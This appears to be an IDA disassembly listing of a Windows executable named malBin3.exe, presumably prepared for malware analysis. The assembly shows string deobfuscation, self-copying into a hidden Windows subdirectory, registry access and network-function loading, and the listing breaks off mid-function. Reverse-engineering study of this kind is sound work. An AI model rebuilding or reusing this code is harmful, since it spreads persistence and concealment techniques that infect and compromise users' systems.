
FuncInfo_V1 struc ; (sizeof=0x1C, mappedto_1)
                        ; XREF: .rdata:stru_408228/r
magicNumber dd ?        ; base 16
maxState dd ?           ; base 10
pUnwindMap dd ?         ; offset
nTryBlocks dd ?         ; base 10
pTryBlockMap dd ?       ; offset
nIPMapEntries dd ?      ; base 10
pIPtoStateMap dd ?      ; offset
FuncInfo_V1 ends


UnwindMapEntry struc ; (sizeof=0x8, mappedto_2)
                        ; XREF: .rdata:stru_408248/r
                        ; .rdata:00408250/r
toState dd ?            ; base 10
action dd ?             ; offset
UnwindMapEntry ends


TryBlockMapEntry struc ; (sizeof=0x14, mappedto_3)
                        ; XREF: .rdata:stru_408258/r
tryLow dd ?             ; base 10
tryHigh dd ?            ; base 10
catchHigh dd ?          ; base 10
nCatches dd ?           ; base 10
pHandlerArray dd ?      ; offset
TryBlockMapEntry ends


HandlerType struc ; (sizeof=0x10, mappedto_4)
                        ; XREF: .rdata:stru_408270/r
adjectives dd ?         ; base 16
pType dd ?              ; offset
dispCatchObj dd ?       ; base 10
addressOfHandler dd ?   ; offset
HandlerType ends


_SCOPETABLE_ENTRY struc ; (sizeof=0xC, align=0x4, copyof_5)
                        ; XREF: .rdata:stru_408218/r
EnclosingLevel dd ?
FilterFunc dd ?         ; offset
HandlerFunc dd ?        ; offset
_SCOPETABLE_ENTRY ends


CPPEH_RECORD struc ; (sizeof=0x18, align=0x4, copyof_10)
                        ; XREF: start/r
old_esp dd ?            ; XREF: start+23/w start:loc_407581/r
exc_ptr dd ?            ; XREF: start:loc_40756D/r ; offset
registration _EH3_EXCEPTION_REGISTRATION ? ; XREF: start+28/w
CPPEH_RECORD ends


_EH3_EXCEPTION_REGISTRATION struc ; (sizeof=0x10, align=0x4, copyof_7)
                        ; XREF: CPPEH_RECORD/r
Next dd ?               ; offset
ExceptionHandler dd ?   ; offset
ScopeTable dd ?         ; offset
TryLevel dd ?           ; XREF: start+28/w
_EH3_EXCEPTION_REGISTRATION ends


_EXPLICIT_ACCESS_A struc ; (sizeof=0x20, align=0x2, copyof_11)
                        ; XREF: sub_404180/r
grfAccessPermissions dd ? ; XREF: sub_404180+B/w
grfAccessMode dd ?      ; XREF: sub_404180+4B/w ; enum ACCESS_MODE
grfInheritance dd ?     ; XREF: sub_404180+53/w
Trustee TRUSTEE_A ?     ; XREF: sub_404180+16/w
                        ; sub_404180+57/w ...
_EXPLICIT_ACCESS_A ends


TRUSTEE_A struc ; (sizeof=0x14, align=0x2, copyof_15)
                        ; XREF: _EXPLICIT_ACCESS_A/r
pMultipleTrustee dd ?   ; XREF: sub_404180+57/w ; offset
MultipleTrusteeOperation dd ? ; XREF: sub_404180+5B/w ; enum MULTIPLE_TRUSTEE_OPERATION
TrusteeForm dd ?        ; XREF: sub_404180+5F/w ; enum TRUSTEE_FORM
TrusteeType dd ?        ; XREF: sub_404180+63/w ; enum TRUSTEE_TYPE
ptstrName dd ?          ; XREF: sub_404180+16/w ; offset
TRUSTEE_A ends


_LUID struc ; (sizeof=0x8, align=0x4, copyof_25)
LowPart dd ?
HighPart dd ?
_LUID ends


_TOKEN_PRIVILEGES struc ; (sizeof=0x10, align=0x4, copyof_27)
                        ; XREF: sub_404230/r sub_4042C0/r
PrivilegeCount dd ?     ; XREF: sub_404230+F/w
Privileges LUID_AND_ATTRIBUTES ? ; XREF: sub_404230+7/o
                        ; sub_404230+17/w
_TOKEN_PRIVILEGES ends


LUID_AND_ATTRIBUTES struc ; (sizeof=0xC, align=0x4, copyof_28)
                        ; XREF: _TOKEN_PRIVILEGES/r
Luid LUID ?
Attributes dd ?         ; XREF: sub_404230+17/w
LUID_AND_ATTRIBUTES ends


LUID struc ; (sizeof=0x8, align=0x4, copyof_30)
                        ; XREF: LUID_AND_ATTRIBUTES/r
LowPart dd ?
HighPart dd ?
LUID ends


PROCESSENTRY32 struc ; (sizeof=0x128, align=0x4, copyof_31)
                        ; XREF: sub_404570/r
dwSize dd ?             ; XREF: sub_404570+88/w
cntUsage dd ?
th32ProcessID dd ?      ; XREF: sub_404570+DF/r
                        ; sub_404570+10E/r ...
th32DefaultHeapID dd ?
th32ModuleID dd ?
cntThreads dd ?         ; XREF: sub_404570+40D/r
th32ParentProcessID dd ?
pcPriClassBase dd ?
dwFlags dd ?
szExeFile db 260 dup(?) ; XREF: sub_404570:loc_404627/o
                        ; sub_404570+1B2/o
PROCESSENTRY32 ends


_WIN32_FIND_DATAA struc ; (sizeof=0x140, align=0x4, copyof_33)
                        ; XREF: sub_404F80/r sub_405170/r ...
dwFileAttributes dd ?   ; XREF: sub_405170+A7/r
                        ; sub_405530+A9/r
ftCreationTime FILETIME ?
ftLastAccessTime FILETIME ?
ftLastWriteTime FILETIME ? ; XREF: sub_405170+1CA/r
                        ; sub_405170+1CE/r
nFileSizeHigh dd ?
nFileSizeLow dd ?
dwReserved0 dd ?
dwReserved1 dd ?
cFileName db 260 dup(?) ; XREF: sub_405170+7D/r
                        ; sub_405170+84/o ...
cAlternateFileName db 14 dup(?)
db ? ; undefined
db ? ; undefined
_WIN32_FIND_DATAA ends


FILETIME struc ; (sizeof=0x8, align=0x4, copyof_34)
                        ; XREF: sub_405BA0/r
                        ; _WIN32_FIND_DATAA/r ...
dwLowDateTime dd ?      ; XREF: sub_405170+1CE/r
dwHighDateTime dd ?     ; XREF: sub_405170+1CA/r
FILETIME ends


_SYSTEMTIME struc ; (sizeof=0x10, align=0x2, copyof_36)
                        ; XREF: sub_405530/r sub_405BA0/r
wYear dw ?
wMonth dw ?             ; XREF: sub_405530+185/r
wDayOfWeek dw ?
wDay dw ?               ; XREF: sub_405530+180/r
wHour dw ?
wMinute dw ?            ; XREF: sub_405530+16C/r
wSecond dw ?
wMilliseconds dw ?
_SYSTEMTIME ends


_FILETIME struc ; (sizeof=0x8, align=0x4) ; XREF: sub_405BA0/r
                        ; sub_405EF0/r
dwLowDateTime dd ?      ; XREF: sub_405BA0+DD/r
                        ; sub_405BA0+FB/w
dwHighDateTime dd ?     ; XREF: sub_405BA0+E1/r
                        ; sub_405BA0+FF/w
_FILETIME ends


_STARTUPINFOA struc ; (sizeof=0x44, align=0x4, copyof_39)
                        ; XREF: sub_406B00/r sub_406BF0/r ...
cb dd ?
lpReserved dd ?         ; offset
lpDesktop dd ?          ; offset
lpTitle dd ?            ; offset
dwX dd ?
dwY dd ?
dwXSize dd ?
dwYSize dd ?
dwXCountChars dd ?
dwYCountChars dd ?
dwFillAttribute dd ?
dwFlags dd ?            ; XREF: sub_406B00+C6/w
                        ; sub_406BF0+124/w ...
wShowWindow dw ?        ; XREF: sub_406B00+D8/w
                        ; sub_406BF0+12C/w ...
cbReserved2 dw ?
lpReserved2 dd ?        ; offset
hStdInput dd ?          ; XREF: sub_406BF0+F0/w ; offset
hStdOutput dd ?         ; XREF: sub_406BF0+10F/w ; offset
hStdError dd ?          ; XREF: sub_406BF0+108/w ; offset
_STARTUPINFOA ends


_PROCESS_INFORMATION struc ; (sizeof=0x10, align=0x4, copyof_43)
                        ; XREF: sub_406B00/r
hProcess dd ?           ; offset
hThread dd ?            ; offset
dwProcessId dd ?
dwThreadId dd ?
_PROCESS_INFORMATION ends


_OSVERSIONINFOA struc ; (sizeof=0x94, align=0x4, copyof_46)
                        ; XREF: .data:VersionInformation/r
dwOSVersionInfoSize dd ?
dwMajorVersion dd ?
dwMinorVersion dd ?
dwBuildNumber dd ?
dwPlatformId dd ?
szCSDVersion db 128 dup(?)
_OSVERSIONINFOA ends


; enum ACCESS_MODE, copyof_13
NOT_USED_ACCESS  = 0
GRANT_ACCESS  = 1
SET_ACCESS  = 2
DENY_ACCESS  = 3
REVOKE_ACCESS  = 4
SET_AUDIT_SUCCESS  = 5
SET_AUDIT_FAILURE  = 6


; enum MULTIPLE_TRUSTEE_OPERATION, copyof_17
NO_MULTIPLE_TRUSTEE  = 0
TRUSTEE_IS_IMPERSONATE  = 1


; enum TRUSTEE_FORM, copyof_19
TRUSTEE_IS_SID  = 0
TRUSTEE_IS_NAME  = 1
TRUSTEE_BAD_FORM  = 2


; enum TRUSTEE_TYPE, copyof_21
TRUSTEE_IS_UNKNOWN  = 0
TRUSTEE_IS_USER  = 1
TRUSTEE_IS_GROUP  = 2
TRUSTEE_IS_DOMAIN  = 3
TRUSTEE_IS_ALIAS  = 4
TRUSTEE_IS_WELL_KNOWN_GROUP  = 5
TRUSTEE_IS_DELETED  = 6
TRUSTEE_IS_INVALID  = 7


; enum _SID_NAME_USE, copyof_38
SidTypeUser  = 1
SidTypeGroup  = 2
SidTypeDomain  = 3
SidTypeAlias  = 4
SidTypeWellKnownGroup  = 5
SidTypeDeletedAccount  = 6
SidTypeInvalid  = 7
SidTypeUnknown  = 8
SidTypeComputer  = 9


; enum SE_OBJECT_TYPE, copyof_44
SE_UNKNOWN_OBJECT_TYPE  = 0
SE_FILE_OBJECT  = 1
SE_SERVICE  = 2
SE_PRINTER  = 3
SE_REGISTRY_KEY  = 4
SE_LMSHARE  = 5
SE_KERNEL_OBJECT  = 6
SE_WINDOW_OBJECT  = 7
SE_DS_OBJECT  = 8
SE_DS_OBJECT_ALL  = 9
SE_PROVIDER_DEFINED_OBJECT  = 0Ah

;
; +-------------------------------------------------------------------------+
; |   This file has been generated by The Interactive Disassembler (IDA)    |
; |           Copyright (c) 2018 Hex-Rays, <support@hex-rays.com>           |
; |                            Freeware version                             |
; +-------------------------------------------------------------------------+
;
; Input SHA256 : E84BA9087FB3F2F7F484F20E9CC0D97D3747047E47AEEA510732F319F5C9D514
; Input MD5    : DB3E5C2F2CE07C2D3FA38D6FC1CEB854
; Input CRC32  : B84857D9

; File Name   : /home/tom/dev/disassembler/malBin3.exe
; Format      : Portable executable for 80386 (PE)
; Imagebase   : 400000
; Timestamp   : 4BC3BBE0 (Tue Apr 13 00:33:36 2010)
; Section 1. (virtual address 00001000)
; Virtual size                  : 000065EA (  26090.)
; Section size in file          : 00007000 (  28672.)
; Offset to raw data for section: 00001000
; Flags 60000020: Text Executable Readable
; Alignment     : default

include uni.inc ; see unicode subdir of ida for info on unicode

.686p
.mmx
.model flat


; Segment type: Pure code
; Segment permissions: Read/Execute
_text segment para public 'CODE' use32
assume cs:_text
;org 401000h
assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing


; Attributes: bp-based frame

sub_401000 proc near

var_10= dword ptr -10h
var_C= dword ptr -0Ch
var_4= dword ptr -4

push    ebp
mov     ebp, esp
push    0FFFFFFFFh
push    offset SEH_401000
mov     eax, large fs:0
push    eax
mov     large fs:0, esp
push    ecx
push    ebx
push    esi
push    edi
mov     [ebp+var_4], 0
mov     [ebp+var_10], esp
call    sub_4010A0
test    eax, eax
jnz     short loc_401047
mov     eax, 1
mov     ecx, [ebp+var_C]
mov     large fs:0, ecx
pop     edi
pop     esi
pop     ebx
mov     esp, ebp
pop     ebp
retn    10h

loc_401047:
call    sub_403220

loc_40104C:
call    ds:WSOCK32_116
mov     ecx, [ebp+var_C]
pop     edi
pop     esi
xor     eax, eax
mov     large fs:0, ecx
pop     ebx
mov     esp, ebp
pop     ebp
retn    10h

loc_401067:
mov     eax, offset loc_40104C
retn
sub_401000 endp

align 10h



sub_401070 proc near

arg_0= dword ptr  4
arg_4= dword ptr  8

push    esi
mov     esi, [esp+4+arg_4]
xor     eax, eax
test    esi, esi
jle     short loc_401090
mov     ecx, [esp+4+arg_0]

loc_40107F:
mov     dl, [eax+ecx]
xor     dl, 11h
sub     dl, 25h
mov     [eax+ecx], dl
inc     eax
cmp     eax, esi
jl      short loc_40107F

loc_401090:
pop     esi
retn
sub_401070 endp

align 10h



sub_4010A0 proc near

ThreadId= dword ptr -4

push    ecx
push    esi
mov     esi, ds:LoadLibraryA
push    edi
push    offset LibFileName ; "Kernel32.dll"
call    esi ; LoadLibraryA
mov     edi, ds:GetProcAddress
push    offset ProcName ; "GetModuleFileNameA"
push    eax             ; hModule
call    edi ; GetProcAddress
push    offset aWs232Dll ; "Ws2_32.dll"
mov     dword_40ACE8, eax
call    esi ; LoadLibraryA
mov     esi, eax
test    esi, esi
jnz     short loc_4010D4
pop     edi
pop     esi
pop     ecx
retn

loc_4010D4:
push    offset aSend    ; "send"
push    esi             ; hModule
call    edi ; GetProcAddress
push    esi             ; hLibModule
mov     dword_40ACE4, eax
call    ds:FreeLibrary
mov     eax, dword_40ACE4
test    eax, eax
jnz     short loc_4010F7
pop     edi
xor     eax, eax
pop     esi
pop     ecx
retn

loc_4010F7:
push    8
push    offset unk_409010
call    sub_401070
push    20h
push    offset SubKey   ; "i"
call    sub_401070
push    24h
push    offset aIoihC   ; "ioih{c"
call    sub_401070
push    3Fh
push    offset aI       ; "i"
call    sub_401070
push    0Bh
push    offset aC_1     ; "c"
call    sub_401070
push    0Dh
push    offset Name     ; "c"
call    sub_401070
push    11h
push    offset aC       ; "c"
call    sub_401070
push    10h
push    offset aC_0     ; "c"
call    sub_401070
add     esp, 40h
push    0Ch
push    offset String2
call    sub_401070
push    16h
push    offset unk_4090FC
call    sub_401070
push    0Bh
push    offset unk_409114
call    sub_401070
push    0Ah
push    offset unk_409648
call    sub_401070
push    0Ah
push    offset unk_409654
call    sub_401070
push    8
push    offset unk_409120
call    sub_401070
push    0Ah
push    offset unk_409660
call    sub_401070
push    0Fh
push    offset unk_40966C
call    sub_401070
add     esp, 40h
push    0Ch
push    offset unk_40967C
call    sub_401070
push    8
push    offset unk_40912C
call    sub_401070
push    0Fh
push    offset unk_409138
call    sub_401070
push    0Eh
push    offset unk_409148
call    sub_401070
push    0Eh
push    offset unk_409158
call    sub_401070
mov     edi, offset unk_409168
or      ecx, 0FFFFFFFFh
xor     eax, eax
repne scasb
not     ecx
add     ecx, 0FFFFFFF8h
push    ecx
push    offset unk_40916F
call    sub_401070
mov     edi, offset unk_4091E8
or      ecx, 0FFFFFFFFh
xor     eax, eax
repne scasb
not     ecx
add     ecx, 0FFFFFFF8h
push    ecx
push    offset unk_4091EF
call    sub_401070
mov     edi, offset unk_409268
or      ecx, 0FFFFFFFFh
xor     eax, eax
repne scasb
not     ecx
add     ecx, 0FFFFFFF8h
push    ecx
push    offset unk_40926F
call    sub_401070
mov     edi, offset unk_4092E8
or      ecx, 0FFFFFFFFh
xor     eax, eax
add     esp, 40h
repne scasb
not     ecx
add     ecx, 0FFFFFFF8h
push    ecx
push    offset unk_4092EF
call    sub_401070
mov     edi, offset unk_409368
or      ecx, 0FFFFFFFFh
xor     eax, eax
repne scasb
not     ecx
add     ecx, 0FFFFFFF8h
push    ecx
push    offset unk_40936F
call    sub_401070
mov     edi, offset unk_4093E8
or      ecx, 0FFFFFFFFh
xor     eax, eax
repne scasb
not     ecx
add     ecx, 0FFFFFFF8h
push    ecx
push    offset unk_4093EF
call    sub_401070
push    16h
push    offset unk_409468
call    sub_401070
push    0Bh
push    offset unk_409480
call    sub_401070
push    0Bh
push    offset unk_40948C
call    sub_401070
push    0Ch
push    offset unk_409498
call    sub_401070
push    13h
push    offset unk_4094A8
call    sub_401070
add     esp, 40h
push    0Dh
push    offset unk_4094C8
call    sub_401070
push    12h
push    offset unk_4094D8
call    sub_401070
push    0Ah
push    offset byte_4094BC
call    sub_401070
push    9
push    offset unk_40962C
call    sub_401070
push    0Dh
push    offset unk_409638
call    sub_401070
push    21h
push    offset unk_40969C
call    sub_401070
push    1Dh
push    offset unk_4096C0
call    sub_401070
push    1Dh
push    offset unk_4096E0
call    sub_401070
add     esp, 40h
push    9
push    offset unk_409700
call    sub_401070
push    0Eh
push    offset unk_40970C
call    sub_401070
add     esp, 10h
mov     esi, offset aBxey ; "^Bxey"

loc_401366:
mov     edi, esi
or      ecx, 0FFFFFFFFh
xor     eax, eax
repne scasb
not     ecx
dec     ecx
push    ecx
push    esi
call    sub_401070
add     esi, 10h
add     esp, 8
cmp     esi, offset unk_40959C
jl      short loc_401366
or      ecx, 0FFFFFFFFh
mov     edi, offset unk_40916F
xor     eax, eax
repne scasb
not     ecx
sub     edi, ecx
mov     eax, ecx
mov     esi, edi
shr     ecx, 2
mov     edi, offset unk_40A82C
rep movsd
mov     ecx, eax
xor     eax, eax
and     ecx, 3
rep movsb
or      ecx, 0FFFFFFFFh
mov     edi, offset unk_4091EF
repne scasb
not     ecx
sub     edi, ecx
mov     edx, ecx
mov     esi, edi
shr     ecx, 2
mov     edi, offset unk_40A7AC
rep movsd
mov     ecx, edx
and     ecx, 3
rep movsb
or      ecx, 0FFFFFFFFh
mov     edi, offset unk_40926F
repne scasb
not     ecx
sub     edi, ecx
mov     eax, ecx
mov     esi, edi
shr     ecx, 2
mov     edi, offset byte_40A72C
rep movsd
mov     ecx, eax
xor     eax, eax
and     ecx, 3
rep movsb
mov     edi, offset unk_4092EF
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
sub     edi, ecx
mov     edx, ecx
mov     esi, edi
mov     edi, offset unk_40A6AC
shr     ecx, 2
rep movsd
mov     ecx, edx
and     ecx, 3
rep movsb
mov     edi, offset unk_40936F
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
sub     edi, ecx
mov     esi, edi
mov     edx, ecx
mov     edi, offset unk_40A6AC
or      ecx, 0FFFFFFFFh
repne scasb
mov     ecx, edx
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, edx
and     ecx, 3
rep movsb
mov     edi, offset unk_4092EF
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
sub     edi, ecx
mov     eax, ecx
mov     esi, edi
mov     edi, offset unk_40A62C
shr     ecx, 2
rep movsd
mov     ecx, eax
xor     eax, eax
and     ecx, 3
rep movsb
or      ecx, 0FFFFFFFFh
mov     edi, offset unk_40967C
repne scasb
not     ecx
sub     edi, ecx
mov     esi, edi
mov     edx, ecx
or      ecx, 0FFFFFFFFh
mov     edi, offset unk_40A62C
repne scasb
mov     ecx, edx
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, edx
and     ecx, 3
rep movsb
or      ecx, 0FFFFFFFFh
mov     edi, offset unk_4092EF
repne scasb
not     ecx
sub     edi, ecx
mov     eax, ecx
mov     esi, edi
shr     ecx, 2
mov     edi, offset unk_40A5AC
rep movsd
mov     ecx, eax
xor     eax, eax
and     ecx, 3
rep movsb
or      ecx, 0FFFFFFFFh
mov     edi, offset unk_4093EF
repne scasb
not     ecx
sub     edi, ecx
mov     esi, edi
mov     edx, ecx
mov     edi, offset unk_40A5AC
or      ecx, 0FFFFFFFFh
repne scasb
mov     ecx, edx
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, edx
and     ecx, 3
rep movsb
mov     edi, offset unk_4092EF
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
sub     edi, ecx
mov     eax, ecx
mov     esi, edi
mov     edi, offset unk_40A52C
shr     ecx, 2
rep movsd
mov     ecx, eax
xor     eax, eax
and     ecx, 3
rep movsb
mov     edi, offset unk_409648
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
sub     edi, ecx
mov     esi, edi
mov     edx, ecx
mov     edi, offset unk_40A52C
or      ecx, 0FFFFFFFFh
repne scasb
mov     ecx, edx
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, edx
and     ecx, 3
rep movsb
or      ecx, 0FFFFFFFFh
mov     edi, offset unk_4092EF
repne scasb
not     ecx
sub     edi, ecx
mov     eax, ecx
mov     esi, edi
shr     ecx, 2
mov     edi, offset unk_40A4AC
rep movsd
mov     ecx, eax
xor     eax, eax
and     ecx, 3
rep movsb
or      ecx, 0FFFFFFFFh
mov     edi, offset unk_409654
repne scasb
not     ecx
sub     edi, ecx
mov     edx, ecx
mov     esi, edi
or      ecx, 0FFFFFFFFh
mov     edi, offset unk_40A4AC
repne scasb
mov     ecx, edx
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, edx
and     ecx, 3
rep movsb
or      ecx, 0FFFFFFFFh
mov     edi, offset unk_4092EF
repne scasb
not     ecx
sub     edi, ecx
mov     eax, ecx
mov     esi, edi
mov     edi, offset unk_40A22C
shr     ecx, 2
rep movsd
mov     ecx, eax
xor     eax, eax
and     ecx, 3
rep movsb
mov     edi, offset unk_409148
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
sub     edi, ecx
mov     esi, edi
mov     edx, ecx
mov     edi, offset unk_40A22C
or      ecx, 0FFFFFFFFh
repne scasb
mov     ecx, edx
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, edx
and     ecx, 3
rep movsb
mov     edi, offset unk_4092EF
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
sub     edi, ecx
mov     eax, ecx
mov     esi, edi
mov     edi, offset unk_40A1AC
shr     ecx, 2
rep movsd
mov     ecx, eax
and     ecx, 3
rep movsb
or      ecx, 0FFFFFFFFh
mov     edi, offset unk_409138
xor     eax, eax
repne scasb
not     ecx
sub     edi, ecx
mov     esi, edi
mov     edx, ecx
or      ecx, 0FFFFFFFFh
mov     edi, offset unk_40A1AC
repne scasb
mov     ecx, edx
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, edx
and     ecx, 3
rep movsb
or      ecx, 0FFFFFFFFh
mov     edi, offset unk_4092EF
repne scasb
not     ecx
sub     edi, ecx
mov     eax, ecx
mov     esi, edi
shr     ecx, 2
mov     edi, offset unk_40A12C
rep movsd
mov     ecx, eax
xor     eax, eax
and     ecx, 3
rep movsb
or      ecx, 0FFFFFFFFh
mov     edi, offset unk_409158
repne scasb
not     ecx
sub     edi, ecx
mov     edx, ecx
mov     esi, edi
or      ecx, 0FFFFFFFFh
mov     edi, offset unk_40A12C
repne scasb
mov     ecx, edx
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, edx
and     ecx, 3
rep movsb
mov     edi, offset unk_4092EF
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
sub     edi, ecx
mov     eax, ecx
mov     esi, edi
mov     edi, offset unk_40A42C
shr     ecx, 2
rep movsd
mov     ecx, eax
xor     eax, eax
and     ecx, 3
rep movsb
mov     edi, offset unk_409120
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
sub     edi, ecx
mov     esi, edi
mov     edx, ecx
mov     edi, offset unk_40A42C
or      ecx, 0FFFFFFFFh
repne scasb
mov     ecx, edx
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, edx
and     ecx, 3
rep movsb
mov     edi, offset unk_4092EF
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
sub     edi, ecx
mov     eax, ecx
mov     esi, edi
shr     ecx, 2
mov     edi, offset unk_40A3AC
rep movsd
mov     ecx, eax
xor     eax, eax
and     ecx, 3
rep movsb
or      ecx, 0FFFFFFFFh
mov     edi, offset unk_409660
repne scasb
not     ecx
sub     edi, ecx
mov     edx, ecx
mov     esi, edi
or      ecx, 0FFFFFFFFh
mov     edi, offset unk_40A3AC
repne scasb
mov     ecx, edx
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, edx
and     ecx, 3
rep movsb
or      ecx, 0FFFFFFFFh
mov     edi, offset unk_4092EF
repne scasb
not     ecx
sub     edi, ecx
mov     eax, ecx
mov     esi, edi
shr     ecx, 2
mov     edi, offset unk_40A32C
rep movsd
mov     ecx, eax
xor     eax, eax
and     ecx, 3
rep movsb
mov     edi, offset unk_40966C
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
sub     edi, ecx
mov     esi, edi
mov     edx, ecx
mov     edi, offset unk_40A32C
or      ecx, 0FFFFFFFFh
repne scasb
mov     ecx, edx
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, edx
and     ecx, 3
rep movsb
mov     edi, offset unk_4092EF
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
sub     edi, ecx
mov     eax, ecx
mov     esi, edi
mov     edi, offset unk_40A2AC
shr     ecx, 2
rep movsd
mov     ecx, eax
xor     eax, eax
and     ecx, 3
rep movsb
mov     edi, offset unk_40912C
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
sub     edi, ecx
mov     esi, edi
mov     edx, ecx
mov     edi, offset unk_40A2AC
or      ecx, 0FFFFFFFFh
repne scasb
mov     ecx, edx
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, edx
push    offset Name     ; "c"
and     ecx, 3
push    eax             ; bInitialState
rep movsb
mov     esi, ds:CreateEventA
push    eax             ; bManualReset
push    eax             ; lpEventAttributes
call    esi ; CreateEventA
push    offset aC       ; "c"
push    0               ; bInitialState
push    0               ; bManualReset
push    0               ; lpEventAttributes
mov     hEvent, eax
call    esi ; CreateEventA
push    offset aC_0     ; "c"
push    0               ; bInitialState
push    0               ; bManualReset
push    0               ; lpEventAttributes
mov     hHandle, eax
call    esi ; CreateEventA
mov     dword_40A060, eax
call    sub_4019C0
test    eax, eax
jnz     short loc_4017FA
pop     edi
pop     esi
pop     ecx
retn

loc_4017FA:             ; lpVersionInformation
push    offset VersionInformation
call    sub_402050
call    sub_402090
neg     eax
sbb     eax, eax
push    0
neg     eax
mov     dword_40AA1C, eax
call    sub_4019E0
call    sub_401D60
call    sub_4037E0
call    sub_407370
call    sub_402A20
call    sub_402EF0
call    sub_403030
call    sub_4018A0
mov     esi, ds:malloc
push    2000h           ; Size
call    esi ; malloc
add     esp, 0Ch
mov     dword_40A094, eax
test    eax, eax
jnz     short loc_40185B
pop     edi
pop     esi
pop     ecx
retn

loc_40185B:             ; Size
push    2000h
call    esi ; malloc
add     esp, 4
mov     lpPathName, eax
test    eax, eax
jnz     short loc_401872
pop     edi
pop     esi
pop     ecx
retn

loc_401872:
call    sub_401B70
lea     eax, [esp+0Ch+ThreadId]
push    eax             ; lpThreadId
push    0               ; dwCreationFlags
push    0               ; lpParameter
push    offset StartAddress ; lpStartAddress
push    0               ; dwStackSize
push    0               ; lpThreadAttributes
call    ds:CreateThread
pop     edi
mov     eax, 1
pop     esi
pop     ecx
retn
sub_4010A0 endp

align 10h



sub_4018A0 proc near

Buffer= byte ptr -200h
FileName= byte ptr -100h

sub     esp, 200h
lea     eax, [esp+200h+FileName]
push    ebx
push    ebp
push    esi
push    edi
push    100h
push    eax
push    0
call    dword_40ACE8
lea     ecx, [esp+210h+Buffer]
push    100h            ; uSize
push    ecx             ; lpBuffer
call    ds:GetWindowsDirectoryA
mov     edi, offset unk_4090FC
or      ecx, 0FFFFFFFFh
xor     eax, eax
lea     edx, [esp+210h+Buffer]
repne scasb
not     ecx
sub     edi, ecx
push    eax             ; lpSecurityAttributes
mov     esi, edi
mov     ebx, ecx
mov     edi, edx
or      ecx, 0FFFFFFFFh
repne scasb
mov     ecx, ebx
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, ebx
lea     eax, [esp+214h+Buffer]
and     ecx, 3
push    eax             ; lpPathName
rep movsb
call    ds:CreateDirectoryA
lea     ecx, [esp+210h+Buffer]
push    ecx             ; lpFileName
call    ds:GetFileAttributesA
mov     ebx, ds:SetFileAttributesA
or      al, 2
lea     edx, [esp+210h+Buffer]
push    eax             ; dwFileAttributes
push    edx             ; lpFileName
call    ebx ; SetFileAttributesA
mov     edi, offset unk_409114
or      ecx, 0FFFFFFFFh
xor     eax, eax
lea     edx, [esp+210h+Buffer]
repne scasb
not     ecx
sub     edi, ecx
push    eax             ; dwFileAttributes
mov     esi, edi
mov     ebp, ecx
mov     edi, edx
or      ecx, 0FFFFFFFFh
repne scasb
mov     ecx, ebp
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, ebp
lea     eax, [esp+214h+FileName]
and     ecx, 3
push    eax             ; lpFileName
rep movsb
call    ebx ; SetFileAttributesA
lea     ecx, [esp+210h+Buffer]
push    0               ; bFailIfExists
lea     edx, [esp+214h+FileName]
push    ecx             ; lpNewFileName
push    edx             ; lpExistingFileName
call    ds:CopyFileA
lea     eax, [esp+210h+FileName]
push    eax             ; lpFileName
call    sub_405EF0
add     esp, 4
pop     edi
pop     esi
pop     ebp
pop     ebx
add     esp, 200h
retn
sub_4018A0 endp

align 10h



; int __cdecl sub_401990(LPCSTR lpPathName)
sub_401990 proc near

lpPathName= dword ptr  4

push    esi
mov     esi, [esp+4+lpPathName]
push    0               ; lpSecurityAttributes
push    esi             ; lpPathName
call    ds:CreateDirectoryA
push    esi             ; lpFileName
call    ds:GetFileAttributesA
or      al, 6
push    eax             ; dwFileAttributes
push    esi             ; lpFileName
call    ds:SetFileAttributesA
pop     esi
retn
sub_401990 endp

align 10h



sub_4019C0 proc near

var_190= byte ptr -190h

sub     esp, 190h
lea     eax, [esp+190h+var_190]
push    eax
push    2
call    ds:WSOCK32_115
neg     eax
sbb     eax, eax
inc     eax
add     esp, 190h
retn
sub_4019C0 endp

align 10h



sub_4019E0 proc near

phkResult= dword ptr -288h
cbData= dword ptr -284h
Data= byte ptr -280h
var_27F= byte ptr -27Fh
Str= byte ptr -200h
arg_0= dword ptr  4

sub     esp, 288h
push    ebp
push    esi
xor     esi, esi
lea     eax, [esp+290h+phkResult]
push    esi             ; lpdwDisposition
push    eax             ; phkResult
push    esi             ; lpSecurityAttributes
push    2001Fh          ; samDesired
push    esi             ; dwOptions
push    offset Class    ; lpClass
push    esi             ; Reserved
push    offset SubKey   ; "i"
push    80000002h       ; hKey
mov     [esp+2B4h+cbData], 80h
call    ds:RegCreateKeyExA
mov     eax, [esp+290h+phkResult]
mov     ebp, ds:RegQueryValueExA
lea     ecx, [esp+290h+cbData]
lea     edx, [esp+290h+Data]
push    ecx             ; lpcbData
push    edx             ; lpData
push    esi             ; lpType
push    esi             ; lpReserved
push    offset ValueName ; "pid"
push    eax             ; hKey
call    ebp ; RegQueryValueExA
test    eax, eax
jnz     short loc_401A66
mov     al, [esp+290h+Data]
test    al, al
jz      short loc_401A50

loc_401A3F:
dec     al
mov     pszValue[esi], al
mov     al, [esp+esi+290h+var_27F]
inc     esi
test    al, al
jnz     short loc_401A3F

loc_401A50:
